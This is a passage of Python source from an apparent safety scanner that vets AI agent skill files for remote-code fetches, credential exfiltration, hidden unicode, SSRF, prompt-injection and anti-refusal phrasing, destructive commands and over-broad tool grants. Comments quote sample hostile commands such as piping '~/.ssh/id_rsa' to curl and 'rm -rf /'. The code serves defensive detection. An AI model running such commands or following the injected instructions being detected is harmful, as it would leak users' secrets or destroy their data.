            doc = _looks_like_documentation(
                check="remote_code_execution", category=category, body=body,
                match_start=m.start(), code_spans=code_spans,
            )
            if suspicious and not doc:
                sev, msg = (
                    CRITICAL,
                    (
                        "Fetches a script from a hidden/untrusted URL (raw IP, shortener, or non-HTTPS) "  # noqa: E501
                        "and executes it — a staged-download payload. A skill must not do this."
                    ),
                )
            else:
                sev, msg = (
                    WARNING,
                    (
                        "Instructs the agent to fetch a remote script and run it. Common for tool "
                        "installers, but it executes unreviewed remote code — verify the source."
                    ),
                )
            findings.append(
                _finding(
                    "remote_code_execution",
                    sev,
                    msg,
                    evidence=m.group(0),
                    line=_line_of(body, m.start()),
                )
            )

    # Exfiltration needs BOTH a sensitive source and an egress sink near it —
    # AND the source must be read as *data*, not used as an auth identity. A
    # legit deploy/monitoring skill does `ssh -i ~/.ssh/id_rsa host`; an exfil
    # payload does `cat ~/.ssh/id_rsa | curl …`. Skip identity-flag usage.
    for sm in _SENSITIVE_SOURCE.finditer(body):
        prefix = body[max(0, sm.start() - 14) : sm.start()]
        if re.search(r"(?i)(?:-i|--identity|--key|identityfile|-CertificateFile)\s*$", prefix):
            continue
        win_lo, win_hi = max(0, sm.start() - 200), min(len(body), sm.end() + 200)
        if _EGRESS_SINK.search(body[win_lo:win_hi]):
            doc = _looks_like_documentation(
                check="data_exfiltration", category=category, body=body,
                match_start=sm.start(), code_spans=code_spans,
            )
            sev = WARNING if doc else CRITICAL
            findings.append(
                _finding(
                    "data_exfiltration",
                    sev,
                    "Reads a sensitive source (keys / keychain / env / wallet) and sends it to a "
                    "network sink nearby" + ("" if not doc else " — documented, not blocked") + ".",
                    evidence=sm.group(0),
                    line=_line_of(body, sm.start()),
                )
            )

    # 5. Obfuscated unicode. Bidi OVERRIDES/EMBEDDINGS (U+202A–U+202E) have
    #    essentially no legitimate use in a skill (Trojan Source) → CRITICAL
    #    regardless of context. Bidi ISOLATES and zero-width → WARNING.
    _bidi = _BIDI_OVERRIDE.search(body)
    if _bidi:
        findings.append(
            _finding(
                "obfuscated_unicode",
                CRITICAL,
                "Contains bidirectional-override unicode that can hide instructions from a human "
                "reviewer (a 'Trojan Source' technique).",
                line=_line_of(body, _bidi.start()),
            )
        )
    # Zero-width AND bidi-isolate chars are WARNING — skip matches inside code
    # (fenced OR inline `…`): a data/i18n/security skill legitimately DOCUMENTS a
    # char to strip (a BOM `﻿`) or an isolate to use (`U+2068`). Overrides above
    # stay CRITICAL everywhere (Trojan Source lives in code, so never skipped).
    _code_all = list(code_spans) + [(m.start(), m.end()) for m in re.finditer(r"`[^`\n]+`", body)]
    _zw_hits = [m for m in _ZERO_WIDTH.finditer(body) if not _in_spans(m.start(), _code_all)]
    if _zw_hits:
        findings.append(
            _finding(
                "obfuscated_unicode",
                WARNING,
                f"Contains {len(_zw_hits)} zero-width unicode character(s) outside code — often used to obfuscate text.",  # noqa: E501
                line=_line_of(body, _zw_hits[0].start()),
            )
        )
    _iso_hits = [m for m in _BIDI_ISOLATE.finditer(body) if not _in_spans(m.start(), _code_all)]
    if _iso_hits:
        findings.append(
            _finding(
                "obfuscated_unicode",
                WARNING,
                f"Contains {len(_iso_hits)} bidi-isolate character(s) outside code — legitimate for "  # noqa: E501
                "right-to-left text, but name them as U+2068… rather than embedding live controls.",
                line=_line_of(body, _iso_hits[0].start()),
            )
        )

    # 6. Opaque blobs (staged payloads), outside legitimate fenced code.
    for m in _OPAQUE_BLOB.finditer(body):
        if _in_spans(m.start(), code_spans):
            continue
        findings.append(
            _finding(
                "opaque_blob",
                WARNING,
                "Long opaque base64/hex blob in prose — can hide an encoded payload.",
                evidence=m.group(0)[:24] + "…",
                line=_line_of(body, m.start()),
            )
        )

    # 7. Suspicious URLs (shorteners / raw IPs hide a fetch destination).
    for label, pat in (("URL shortener", _SHORTENER), ("raw-IP URL", _RAW_IP_URL)):
        for m in pat.finditer(body):
            findings.append(
                _finding(
                    "suspicious_url",
                    WARNING,
                    f"{label} obscures where a fetch would go.",
                    evidence=m.group(0),
                    line=_line_of(body, m.start()),
                )
            )

    # 8. Injection phrasing — INFO only.
    for m in _INJECTION_PHRASE.finditer(body):
        findings.append(
            _finding(
                "prompt_injection_phrasing",
                INFO,
                "Contains instruction-override phrasing. Expected in skills that teach injection "
                "resistance; informational only.",
                evidence=m.group(0),
                line=_line_of(body, m.start()),
            )
        )

    # ── v3 checks ──────────────────────────────────────────────────────

    # SSRF / metadata + /proc/environ — CRITICAL, doc-downgradable (behaves like the
    # RCE family). The benchmark pre-execution denylist stays a separate unconditional
    # layer for executable bundles; this covers the skill body / CLI surface.
    _behavioral(_SSRF_METADATA, "ssrf_metadata", "Cloud metadata / SSRF")

    # Agent-config snooping — reading another agent's config / MCP manifest.
    for m in _AGENT_SNOOP.finditer(body):
        doc = _looks_like_documentation(
            check="agent_snooping", category=category, body=body,
            match_start=m.start(), code_spans=code_spans,
        )
        findings.append(
            _finding(
                "agent_snooping",
                WARNING,
                "Reads another agent's config / installed skills / MCP manifest"
                + (
                    " — documented, not blocked"
                    if doc
                    else " — a skill shouldn't snoop on the host's other agents"
                )
                + ".",
                evidence=m.group(0),
                line=_line_of(body, m.start()),
            )
        )

    # Anti-refusal / jailbreak instructions. Downgrade ONLY on the security-category
    # signal — the generic doc-marker window can't be used here because the trigger
    # words themselves ("never", "do not", "without") ARE doc markers, so a real
    # jailbreak would always self-downgrade.
    _anti_doc = (category or "").strip().lower() in _SECURITY_CATEGORIES
    for m in _ANTI_REFUSAL.finditer(body):
        findings.append(
            _finding(
                "anti_refusal",
                INFO if _anti_doc else WARNING,
                "Instructs the agent to drop its refusals / safety guidelines"
                + (" — documented, informational" if _anti_doc else " — reads as a jailbreak")
                + ".",
                evidence=m.group(0),
                line=_line_of(body, m.start()),
            )
        )

    # Production-destructive commands (rm -rf /, dd to a device, unscoped DROP, …).
    #
    # Base severity is WARNING with a doc-downgrade, deliberately NOT
    # CRITICAL-unless-downgraded. The difference is who holds the last lever:
    # CRITICAL blocks, so the doc-downgrade would be the only thing standing between a
    # match and a block — and that downgrade consults `category`, a free-form field the
    # AUTHOR sets on their own content. At WARNING base the lever is gone rather than
    # narrowed: warning → FLAGGED, never BLOCKED, so no value of `category` can decide
    # whether the skill publishes. The category downgrade still softens WARNING → INFO
    # on genuine documentation.
    #
    # WARNING also matches how the check actually fires. Measured across every readable
    # public skill in a multi-thousand-skill corpus, the handful of matches that leaned
    # on the category lever were all defenders, not attackers: a quoted `rm -rf /` in a
    # Perl injection warning, a Kali `dd` writing an install image, two forensics
    # denylists. Flagging those is right; blocking them is not.
    _behavioral(
        _DESTRUCTIVE,
        "destructive_commands",
        "Destructive command",
        base=WARNING,
        downgraded=INFO,
        instruction_suffix=" — destructive if run against a production target; review the context.",
    )

    # Mixed-script homoglyph inside a command/URL token — check URLs + fenced code.
    _homoglyph_seen: set[int] = set()
    for span_start, span_text in _homoglyph_candidates(body, code_spans):
        if span_start in _homoglyph_seen:
            continue
        if _CYR_GREEK.search(span_text) and _ASCII_LETTER.search(span_text):
            _homoglyph_seen.add(span_start)
            findings.append(
                _finding(
                    "unicode_homoglyph",
                    WARNING,
                    "Mixed-script text (a Cyrillic/Greek look-alike inside ASCII) in a command or URL — "  # noqa: E501
                    "can disguise a different command or destination.",
                    evidence=span_text[:60],
                    line=_line_of(body, span_start),
                )
            )

    # Tool over-reach — wildcard / over-broad allowed-tools grant.
    for finding in _check_tool_overreach(allowed_tools):
        findings.append(finding)

    # Trigger abuse — activation-maximizing trigger phrases (INFO, hygiene only).
    for phrase in trigger_phrases or []:
        norm = (phrase or "").strip().lower()
        if norm in _TRIGGER_ABUSE or (len(norm) <= 3 and norm.isalpha()):
            findings.append(
                _finding(
                    "trigger_abuse",
                    INFO,
                    f"Trigger phrase {phrase!r} is activation-maximizing (matches almost anything) — "  # noqa: E501
                    "narrow it so the router offers this skill only when it's actually relevant.",
                    evidence=phrase,
                )
            )

    counts = {
        "critical": sum(1 for f in findings if f["severity"] == CRITICAL),
        "warning": sum(1 for f in findings if f["severity"] == WARNING),
        "info": sum(1 for f in findings if f["severity"] == INFO),
    }
    if counts["critical"]:
        status = STATUS_BLOCKED
    elif counts["warning"]:
        status = STATUS_FLAGGED
    else:
        status = STATUS_CLEAN

    if status == STATUS_CLEAN:
        summary = (
            "No safety issues found."
            if not counts["info"]
            else "No issues (informational notes only)."
        )
    else:
        parts = []
        if counts["critical"]:
            parts.append(f"{counts['critical']} critical")
        if counts["warning"]:
            parts.append(f"{counts['warning']} warning" + ("s" if counts["warning"] != 1 else ""))
        summary = ", ".join(parts)

    return {
        "scanned_at": datetime.now(timezone.utc).isoformat(),
        "scanner_version": SCANNER_VERSION,
        "status": status,
        "summary": summary,
        "checks": list(CHECKS_PERFORMED),
        "findings": findings,
        "counts": counts,
    }


# ── SARIF 2.1.0 output (for `--format sarif` + GitHub code scanning) ──────────

_SARIF_LEVEL = {CRITICAL: "error", WARNING: "warning", INFO: "note"}


def to_sarif(
    result: dict[str, Any], *, skill_name: str = "", file_path: str = "SKILL.md"
) -> dict[str, Any]:
    """Render a scan ``result`` as a SARIF 2.1.0 log (a plain dict → json.dumps).

    One rule per check (with its group + remediation as help text); one result per
    finding, at its line (fallback line 1 when a finding has none). Uploadable via
    ``github/codeql-action/upload-sarif`` to get code-scanning alerts.
    """
    rules = [
        {
            "id": check,
            "name": check,
            "shortDescription": {"text": check.replace("_", " ")},
            "properties": {"group": CHECK_GROUPS.get(check, "other")},
            **({"help": {"text": CHECK_REMEDIATION[check]}} if check in CHECK_REMEDIATION else {}),
        }
        for check in CHECKS_PERFORMED
    ]
    results = []
    for f in result.get("findings", []):
        msg = f.get("message", "")
        if f.get("remediation"):
            msg = f"{msg} Fix: {f['remediation']}"
        results.append(
            {
                "ruleId": f.get("check", "unknown"),
                "level": _SARIF_LEVEL.get(f.get("severity"), "note"),
                "message": {"text": msg},
                "locations": [
                    {
                        "physicalLocation": {
                            "artifactLocation": {"uri": file_path},
                            "region": {"startLine": f.get("line") or 1},
                        }
                    }
                ],
            }
        )
    return {
        "version": "2.1.0",
        "$schema": "https://json.schemastore.org/sarif-2.1.0.json",
        "runs": [
            {
                "tool": {
                    "driver": {
                        "name": "decimalai-skill-scan",
                        "informationUri": "https://docs.decimal.ai/guides/trust-safety/how-skills-are-vetted",
                        "semanticVersion": SCANNER_VERSION,
                        "rules": rules,
                    }
                },
                "results": results,
                "properties": {"skill": skill_name, "status": result.get("status")},
            }
        ],
    }
